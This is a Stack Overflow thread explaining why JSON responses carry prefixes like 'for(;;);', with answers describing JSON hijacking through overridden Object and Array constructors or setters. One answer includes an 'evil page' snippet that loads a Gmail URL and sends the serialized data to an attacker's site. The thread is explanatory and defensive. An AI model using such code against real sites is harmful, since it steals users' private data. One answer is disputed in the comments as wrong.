<?xml version="1.0" encoding="utf-8"?>
<post><title>javascript - Why do people put code like "throw 1; &lt;dont be evil&gt;" and "for(;;);" in front of json responses? - Stack Overflow</title><question><text><div class="post-text" itemprop="text">
<blockquote>
<p><strong>Possible Duplicate:</strong><br/>
<a href="http://stackoverflow.com/questions/871505/why-have-while1-in-xmlhttprequest-response">Why have “while(1);” in XmlHttpRequest response?</a><br/>
<a href="http://stackoverflow.com/questions/2669690/why-does-google-prepend-while1-to-their-json-responses">Why does Google prepend while(1); to their JSON responses?</a> </p>
</blockquote>
<p>Google returns json like this:</p>
<pre class="default prettyprint prettyprinted" style=""><code><span class="kwd">throw</span><span class="pln"> </span><span class="lit">1</span><span class="pun">;</span><span class="pln"> </span><span class="pun">&lt;</span><span class="pln">dont be evil</span><span class="pun">&gt;</span><span class="pln"> </span><span class="pun">{</span><span class="pln"> foo</span><span class="pun">:</span><span class="pln"> bar</span><span class="pun">}</span></code></pre>
<p>and Facebooks ajax has json like this:</p>
<pre class="default prettyprint prettyprinted" style=""><code><span class="kwd">for</span><span class="pun">(;;);</span><span class="pln"> </span><span class="pun">{</span><span class="str">"error"</span><span class="pun">:</span><span class="lit">0</span><span class="pun">,</span><span class="str">"errorSummary"</span><span class="pun">:</span><span class="pln"> </span><span class="str">""</span><span class="pun">}</span></code></pre>
<ul>
<li>Why do they put code that would stop
execution and makes invalid json?</li>
<li>How do they parse it if it's invalid
and would crash if you tried to eval
it?</li>
<li>Do they just remove it from the
string (seems expensive)?</li>
<li>Are there any security advantages to
this?</li>
</ul>
<p>In response to it being for security purposes:</p>
<p>If the scraper is on another domain they would have to use a <code>script</code> tag to get the data because XHR won't work cross-domain. Even without the <code>for(;;);</code> how would the attacker get the data? It's not assigned to a variable so wouldn't it just be garbage collected because there's no references to it?</p>
<p>Basically to get the data cross domain they would have to do</p>
<pre class="default prettyprint prettyprinted" style=""><code><span class="tag">&lt;script</span><span class="pln"> </span><span class="atn">src</span><span class="pun">=</span><span class="atv">"http://target.com/json.js"</span><span class="tag">&gt;&lt;/script&gt;</span></code></pre>
<p>But even without the crash script prepended the attacker can't use any of the Json data without it being assigned to a variable that you can access globally (it isn't in these cases). The crash code effectivly does nothing because even without it they have to use server sided scripting to use the data on their site. </p>
</div></text><author><a href="/users/148766/christopher-tarquini">Christopher Tarquini</a></author><comments><comment><text><span class="comment-copy">Can you provide a link to the site/json that has this?</span></text><author><a class="comment-user" href="/users/368772/tcooc" title="11,321 reputation">tcooc</a></author></comment><comment><text><span class="comment-copy">See: <a href="http://stackoverflow.com/questions/3058401/empty-for-loop-in-facebook-ajax" title="empty for loop in facebook ajax">stackoverflow.com/questions/3058401/…</a> <a href="http://stackoverflow.com/questions/2669690/why-does-google-append-while1-in-front-of-their-json-responses" title="why does google append while1 in front of their json responses">stackoverflow.com/questions/2669690/…</a></span></text><author><a class="comment-user" href="/users/5445/cms" title="488,596 reputation">CMS</a></author></comment><comment><text><span class="comment-copy">^ I updated the question because those don't answer the part I'm interested in.</span></text><author><a class="comment-user owner" href="/users/148766/christopher-tarquini" title="5,197 reputation">Christopher Tarquini</a></author></comment><comment><text><span class="comment-copy">Haha, love the "Don't be Evil" part :)</span></text><author><a class="comment-user" href="/users/145577/gertjan" title="782 reputation">Gertjan</a></author></comment><comment><text><span class="comment-copy">+1 Killer question,  but you got wrong answer.  I found an explanation from a Google employee,  check it out.</span></text><author><a class="comment-user" href="/users/183528/rook" title="43,765 reputation">rook</a></author></comment></comments></question><answers><answer><text><div class="post-text" itemprop="text">
<blockquote>
<p>Even without the <code>for(;;);</code> how would the attacker get the data?</p>
</blockquote>
<p>Attacks are based on altering the behaviour of the built-in types, in particular <code>Object</code> and <code>Array</code>, by altering their constructor function or its <code>prototype</code>. Then when the targeted JSON uses a <code>{...}</code> or <code>[...]</code> construct, they'll be the attacker's own versions of those objects, with potentially-unexpected behaviour.</p>
<p>For example, you can hack a setter-property into <code>Object</code>, that would betray the values written in object literals:</p>
<pre class="default prettyprint prettyprinted" style=""><code><span class="typ">Object</span><span class="pun">.</span><span class="pln">prototype</span><span class="pun">.</span><span class="pln">__defineSetter__</span><span class="pun">(</span><span class="str">'x'</span><span class="pun">,</span><span class="pln"> </span><span class="kwd">function</span><span class="pun">(</span><span class="pln">x</span><span class="pun">)</span><span class="pln"> </span><span class="pun">{</span><span class="pln">
    alert</span><span class="pun">(</span><span class="str">'Ha! I steal '</span><span class="pun">+</span><span class="pln">x</span><span class="pun">);</span><span class="pln">
</span><span class="pun">});</span></code></pre>
<p>Then when a <code>&lt;script&gt;</code> was pointed at some JSON that used that property name:</p>
<pre class="default prettyprint prettyprinted" style=""><code><span class="pun">{</span><span class="str">"x"</span><span class="pun">:</span><span class="pln"> </span><span class="str">"hello"</span><span class="pun">}</span></code></pre>
<p>the value <code>"hello"</code> would be leaked. </p>
<p>The way that array and object literals cause setters to be called is controversial. Firefox removed the behaviour in version 3.5, in response to publicised attacks on high-profile web sites. However at the time of writing Safari (4) and Chrome (5) are still vulnerable to this.</p>
<p>Another attack that all browsers now disallow was to redefine constructor functions:</p>
<pre class="default prettyprint prettyprinted" style=""><code><span class="typ">Array</span><span class="pun">=</span><span class="pln"> </span><span class="kwd">function</span><span class="pun">()</span><span class="pln"> </span><span class="pun">{</span><span class="pln">
    alert</span><span class="pun">(</span><span class="str">'I steal '</span><span class="pun">+</span><span class="kwd">this</span><span class="pun">);</span><span class="pln">
</span><span class="pun">};</span><span class="pln">

</span><span class="pun">[</span><span class="lit">1</span><span class="pun">,</span><span class="pln"> </span><span class="lit">2</span><span class="pun">,</span><span class="pln"> </span><span class="lit">3</span><span class="pun">]</span></code></pre>
<p>And for now, IE8's implementation of properties (based on the ECMAScript Fifth Edition standard and <code>Object.defineProperty</code>) currently does not work on <code>Object.prototype</code> or <code>Array.prototype</code>.</p>
<p>But as well as protecting past browsers, it may be that extensions to JavaScript cause more potential leaks of a similar kind in future, and in that case chaff should protect against those too.</p>
</div></text><author><a href="/users/18936/bobince">bobince</a></author><comments><comment><text><span class="comment-copy">Very interesting I never thought of using setters. +1</span></text><author><a class="comment-user owner" href="/users/148766/christopher-tarquini" title="5,197 reputation">Christopher Tarquini</a></author></comment><comment><text><span class="comment-copy">This is absolutely the correct answer and should have been selected for this question.</span></text><author><a class="comment-user" href="/users/328501/jesse-dhillon" title="5,532 reputation">Jesse Dhillon</a></author></comment><comment><text><span class="comment-copy">How does the attacker influence the constructor?   How is this tainted data executed by the client?</span></text><author><a class="comment-user" href="/users/183528/rook" title="43,765 reputation">rook</a></author></comment><comment><text><span class="comment-copy">Read about CSRF attacks.</span></text><author><a class="comment-user" href="/users/328501/jesse-dhillon" title="5,532 reputation">Jesse Dhillon</a></author></comment><comment><text><span class="comment-copy">+1 Yes,  bobice is correct.  I wanted to see a real world attack like this one against gmail: <a href="http://jeremiahgrossman.blogspot.com/2006/01/advanced-web-attack-techniques-using.html" rel="nofollow noreferrer">jeremiahgrossman.blogspot.com/2006/01/…</a></span></text><author><a class="comment-user" href="/users/183528/rook" title="43,765 reputation">rook</a></author></comment><comment><text><span class="comment-copy">It took me quite some thinking to understand the attack mechanism here. For anyone who doesn't get it: the attacker lures the user to a page under the attacker's control which has two script tags on it. The first script makes the needed modifications to the prototypes of Array and Object. The second script tag's <code>src</code> attribute points to the JSON-returning URL on the target site, causing the user to fetch the JSON (sending cookies with the request; there's no way to avoid that in a script request) and execute it as JavaScript.</span></text><author><a class="comment-user" href="/users/1709587/mark-amery" title="32,062 reputation">Mark Amery</a></author></comment></comments></answer><answer><text><div class="post-text" itemprop="text">
<p>Consider that, after checking your GMail account, that you go visit my evil page:</p>
<pre class="default prettyprint prettyprinted" style=""><code><span class="tag">&lt;script</span><span class="pln"> </span><span class="atn">type</span><span class="pun">=</span><span class="atv">"text/javascript"</span><span class="tag">&gt;</span><span class="pln">
</span><span class="typ">Object</span><span class="pln"> </span><span class="pun">=</span><span class="pln"> </span><span class="kwd">function</span><span class="pun">()</span><span class="pln"> </span><span class="pun">{</span><span class="pln">
  ajaxRequestToMyEvilSite</span><span class="pun">(</span><span class="pln">JSON</span><span class="pun">.</span><span class="pln">serialize</span><span class="pun">(</span><span class="kwd">this</span><span class="pun">));</span><span class="pln">
</span><span class="pun">}</span><span class="pln">
</span><span class="tag">&lt;/script&gt;</span><span class="pln">
</span><span class="tag">&lt;script</span><span class="pln"> </span><span class="atn">type</span><span class="pun">=</span><span class="atv">"text/javascript"</span><span class="pln"> </span><span class="atn">src</span><span class="pun">=</span><span class="atv">"http://gmail.com/inbox/listMessage"</span><span class="tag">&gt;&lt;/script&gt;</span></code></pre>
<p>What will happen now is that the Javascript code that comes from Google -- which the asker thought would be benign and immediately fall out of scope -- will actually be posted to my evil site. Suppose that the URL requested in the script tag sends (because your browser will present the proper cookie, Google will correctly think that you are logged in to your inbox):</p>
<pre class="default prettyprint prettyprinted" style=""><code><span class="pun">({</span><span class="pln">
  messages</span><span class="pun">:</span><span class="pln"> </span><span class="pun">[</span><span class="pln">
    </span><span class="pun">{</span><span class="pln">
      id</span><span class="pun">:</span><span class="pln"> </span><span class="lit">1</span><span class="pun">,</span><span class="pln">
      subject</span><span class="pun">:</span><span class="pln"> </span><span class="str">'Super confidential information'</span><span class="pun">,</span><span class="pln">
      message</span><span class="pun">:</span><span class="pln"> </span><span class="str">'Please keep this to yourself: the password is 42'</span><span class="pln">
    </span><span class="pun">},{</span><span class="pln">
      id</span><span class="pun">:</span><span class="pln"> </span><span class="lit">2</span><span class="pun">,</span><span class="pln">
      subject</span><span class="pun">:</span><span class="pln"> </span><span class="str">'Who stole your password?'</span><span class="pun">,</span><span class="pln">
      message</span><span class="pun">:</span><span class="pln"> </span><span class="str">'Someone knows your password! I told you to keep this information to yourself! And by this information I mean: the password is 42'</span><span class="pln">
    </span><span class="pun">}</span><span class="pln">
  </span><span class="pun">]</span><span class="pln">
</span><span class="pun">})</span></code></pre>
<p>Now, I will be posting a serialized version of this object to my evil server. Thank you!</p>
<p>The way to prevent this from happening is to cruft up your JSON responses, and decruft them when you, from the same domain, can manipulate that data. If you like this answer, please accept the one posted by bobince.</p>
</div></text><author><a href="/users/328501/jesse-dhillon">Jesse Dhillon</a></author><comments><comment><text><span class="comment-copy">I´m pretty sure Gmail´s auth is not only based on cookies, as that would be very, very weak as you describe here. I think they also incorperate session keys in the URL, which you page can´t just intercept.</span></text><author><a class="comment-user" href="/users/84535/dykam" title="7,781 reputation">Dykam</a></author></comment><comment><text><span class="comment-copy">The problem with a site whose target audience is programmers, is that every once in a while you will encounter people who are {hope,point,use}lessly pedantic. Try this: a) It's an example of how such an attack could work, not the complete hacker's reference for carrying out attacks against Gmail, and b) as has been pointed out another answer to this question, a similar attack was demonstrated against Gmail, allowing an attacker to access a user's contact list.</span></text><author><a class="comment-user" href="/users/328501/jesse-dhillon" title="5,532 reputation">Jesse Dhillon</a></author></comment><comment><text><span class="comment-copy">+1 as this explains how the attack is viable really well.</span></text><author><a class="comment-user" href="/users/840973/alex-coplan" title="7,969 reputation">Alex Coplan</a></author></comment></comments></answer><answer><text><div class="post-text" itemprop="text">
<p><strong>EDIT</strong> </p>
<p>These strings are commonly referred to as an "unparseable cruft" and they are used to patch an information leakage vulnerability that affects the JSON specification.  This attack is real world and <a href="http://jeremiahgrossman.blogspot.com/2006/01/advanced-web-attack-techniques-using.html" rel="nofollow noreferrer">a vulnerability in gmail was discovered by Jeremiah Grossman</a>.    Mozilla also believes this to be a vulnerability in the JSON specification and it has been <a href="http://ejohn.org/blog/re-securing-json/" rel="nofollow noreferrer">patched in Firefox 3</a>.  However because this issue still affects other browsers this "unparseable cruft" is required because it is a compatible patch. </p>
<p>Bobice's answer has a technical explanation of this attack and it is correct.</p>
</div></text><author><a href="/users/183528/rook">rook</a></author><comments><comment><text><span class="comment-copy">Now that makes a lot more sense usage wise and it explains why sites like google and facebook use it (allowing cross domain requests for gadgets, widgets and what-have-you)</span></text><author><a class="comment-user owner" href="/users/148766/christopher-tarquini" title="5,197 reputation">Christopher Tarquini</a></author></comment><comment><text><span class="comment-copy">This is not the right answer, no matter who gave you the answer. The right answer, in terms comprehensiveness <i>and</i> correctness, is the one given by user bobince at the bottom. Preventing JSON output from a script from being viewed in a browser doesn't even make sense, if it has Content-Type <code>text/json</code> it would not even be opened and if it were <code>text/[x]html</code> it would be bad HTML. In no case would the browser execute it if fed as the input document. Crufting is to prevent CSRF attacks and JSON evaluation, because on an attacker's site the Object prototype could be overridden to steal data.</span></text><author><a class="comment-user" href="/users/328501/jesse-dhillon" title="5,532 reputation">Jesse Dhillon</a></author></comment><comment><text><span class="comment-copy">@Jesse Dhillon bobince maybe correct but his post is missing something,  its not clear how the attacker is able to influence the constructor.  I still think this is to protect a Cross-Domain Proxy.  For now i'm siding with google.</span></text><author><a class="comment-user" href="/users/183528/rook" title="43,765 reputation">rook</a></author></comment><comment><text><span class="comment-copy">Read <a href="http://en.wikipedia.org/wiki/CSRF" rel="nofollow noreferrer">en.wikipedia.org/wiki/CSRF</a>. I have a site; you come to my site after logging into your JSON-heavy bank website. On my site I have defined the constructor, because it's my site. I embed a cross-domain script tag which OP thought would result in benign objects being immediately discarded, except they aren't. They're captured by my malicious constructor.</span></text><author><a class="comment-user" href="/users/328501/jesse-dhillon" title="5,532 reputation">Jesse Dhillon</a></author></comment><comment><text><span class="comment-copy">@Jesse Dhillon you should read my profile and i'm still skeptical.</span></text><author><a class="comment-user" href="/users/183528/rook" title="43,765 reputation">rook</a></author></comment><comment><text><span class="comment-copy">@Jesse Dhillon You are right about the content type,  but I can't write off a google employee just yet.  Especially not when bobince's post is missing something.  I am unsure as to how an attacker would go about levering the attack that bobince is describing.</span></text><author><a class="comment-user" href="/users/183528/rook" title="43,765 reputation">rook</a></author></comment><comment><text><span class="comment-copy">Please pardon me if I offend you, but I find it bordering on unbelievable that someone with your background has not a) tested this out him/herself and b) does not see the truth of it a priori, c) would accept the explanation that cruft provides security if/when a user receives a JSON snippet as the input document to the browser. I'm sorry to tell you that your answer is wrong, and if you accurately represented the Google employee's response, then he/she is also wrong.</span></text><author><a class="comment-user" href="/users/328501/jesse-dhillon" title="5,532 reputation">Jesse Dhillon</a></author></comment><comment><text><span class="comment-copy">@Jesse Dhillon I'll admit that i'm not 100% sure about this one.  I don't like bobince's answer because its not an attack scenario.  You must admit that you don't have the answer ether (yet you gave me a -1).  It maybe related to csrf but as it stands i fail to see how this security mechanism prevents an attacker from obtaining a csrf token or bypassing a referer check.</span></text><author><a class="comment-user" href="/users/183528/rook" title="43,765 reputation">rook</a></author></comment><comment><text><span class="comment-copy">@Jesse Dhillon Look at this exploit that I have written (<a href="http://www.exploit-db.com/exploits/7922/" rel="nofollow noreferrer">exploit-db.com/exploits/7922</a>).  If you can tell me how this XHR attack is related to an unparseable curft,  I'll accept that its CSRF related. Because the security mechanism is written in JS,  I'm pretty sure is xss related.</span></text><author><a class="comment-user" href="/users/183528/rook" title="43,765 reputation">rook</a></author></comment><comment><text><span class="comment-copy">The other answer does show how it protects it from a data leakage vulnerability. I don't know if it qualifies as CRSF but it is defiantly a vulnerability/exploit of some kind. It shows using a <code>&lt;script&gt;</code> tag and setters/getters to get the data. Putting a prefix like the above would stop this sort of attack. The other answer might be more correct after all</span></text><author><a class="comment-user owner" href="/users/148766/christopher-tarquini" title="5,197 reputation">Christopher Tarquini</a></author></comment><comment><text><span class="comment-copy">I gave this answer a -1 because I don't believe that the reason is correct, regarding protecting Javascript from being executed if the request URL is accessed directly from the location bar. The rest of this exchange has been great though, my answer is the one I posted just recently and an elaboration of bobince's. Cheers.</span></text><author><a class="comment-user" href="/users/328501/jesse-dhillon" title="5,532 reputation">Jesse Dhillon</a></author></comment><comment><text><span class="comment-copy">@Chris T,  Yes Bobice is correct I didn't agree at first because I wanted to see a real world attack like this one against gmail: (<a href="http://jeremiahgrossman.blogspot.com/2006/01/advanced-web-attack-techniques-using.html" rel="nofollow noreferrer">jeremiahgrossman.blogspot.com/2006/01/…</a>)</span></text><author><a class="comment-user" href="/users/183528/rook" title="43,765 reputation">rook</a></author></comment><comment><text><span class="comment-copy">Your sample exploit works because it's an XSS attack. That's the reason you would be able to decruft the response, because you've managed to get the code presented from the same domain as the target pligg site. That's different than what's going on with the proposed vulnerability here, where we are decrufting without defeating same-origin through XSS.</span></text><author><a class="comment-user" href="/users/328501/jesse-dhillon" title="5,532 reputation">Jesse Dhillon</a></author></comment></comments></answer><answer><text><div class="post-text" itemprop="text">
<blockquote>
<p>How do they parse it if it's invalid and would crash if you tried to eval
  it?</p>
</blockquote>
<p>It's a <em>feature</em> that it would crash if you tried to <code>eval</code> it.  <code>eval</code> allows arbitary JavaScript code, which could be used for a cross-site scripting attack.</p>
<blockquote>
<p>Do they just remove it from the string (seems expensive)?</p>
</blockquote>
<p>I imagine so.  Probably something like:</p>
<pre class="default prettyprint prettyprinted" style=""><code><span class="kwd">function</span><span class="pln"> parseJson</span><span class="pun">(</span><span class="pln">json</span><span class="pun">)</span><span class="pln"> </span><span class="pun">{</span><span class="pln">
   json </span><span class="pun">=</span><span class="pln"> json</span><span class="pun">.</span><span class="pln">replace</span><span class="pun">(</span><span class="str">"throw 1; &lt;dont be evil&gt;"</span><span class="pun">,</span><span class="pln"> </span><span class="str">""</span><span class="pun">);</span><span class="pln">
   </span><span class="kwd">if</span><span class="pln"> </span><span class="pun">(</span><span class="com">/* regex to validate the JSON */</span><span class="pun">)</span><span class="pln"> </span><span class="pun">{</span><span class="pln">
       </span><span class="kwd">return</span><span class="pln"> </span><span class="kwd">eval</span><span class="pun">(</span><span class="pln">json</span><span class="pun">);</span><span class="pln">
   </span><span class="pun">}</span><span class="pln"> </span><span class="kwd">else</span><span class="pln"> </span><span class="pun">{</span><span class="pln">
       </span><span class="kwd">throw</span><span class="pln"> </span><span class="str">"XSS"</span><span class="pun">;</span><span class="pln">
   </span><span class="pun">}</span><span class="pln">
</span><span class="pun">}</span></code></pre>
<p>The "don't be evil" cruft prevents developers from using <code>eval</code> directly instead of a more secure alternative.</p>
</div></text><author><a href="/users/287586/dan04">dan04</a></author><comments><comment><text><span class="comment-copy">It's there to prevent using <code>eval</code>. Don't try to sidestep it, use a dedicated JSON parser instead!</span></text><author><a class="comment-user" href="/users/81804/kibibu" title="3,484 reputation">kibibu</a></author></comment><comment><text><span class="comment-copy">This seems to be closer to the actual purpose than for preventing scraping (being that either way to scrap you need server sided scripting) +1</span></text><author><a class="comment-user owner" href="/users/148766/christopher-tarquini" title="5,197 reputation">Christopher Tarquini</a></author></comment><comment><text><span class="comment-copy">@kibubu A dedicated JSON parser should throw an error on that though.</span></text><author><a class="comment-user" href="/users/364/matt-mitchell" title="21,964 reputation">Matt Mitchell</a></author></comment><comment><text><span class="comment-copy">I'd like to see that regex, if you don't mind. Hint - don't waste time trying to write it <code>:)</code></span></text><author><a class="comment-user" href="/users/7586/kobi" title="91,718 reputation">Kobi</a></author></comment><comment><text><span class="comment-copy">@Kobi Just thinking about it makes me  confused, angry, and nauseous :P</span></text><author><a class="comment-user owner" href="/users/148766/christopher-tarquini" title="5,197 reputation">Christopher Tarquini</a></author></comment><comment><text><span class="comment-copy">@dan04 I don't think this xss attack scenario is realistic.  I don't see how this addresses "dom based xss"  or even using XHR+XSS to forge requests,  which was used by the "Sammy Worm".</span></text><author><a class="comment-user" href="/users/183528/rook" title="43,765 reputation">rook</a></author></comment><comment><text><span class="comment-copy">@dan04 I knew it,  this is the wrong answer.  I found an explanation from a Google employee.</span></text><author><a class="comment-user" href="/users/183528/rook" title="43,765 reputation">rook</a></author></comment><comment><text><span class="comment-copy">A bit late to the party, but this answer is completely irrelevant and wrong.</span></text><author><a class="comment-user" href="/users/5822997/michael" title="700 reputation">michael</a></author></comment></comments></answer></answers></post>